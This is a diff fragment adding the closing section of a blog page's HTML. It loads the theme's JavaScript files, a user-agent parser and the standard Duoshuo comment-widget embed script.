+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"rogerzhuo"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
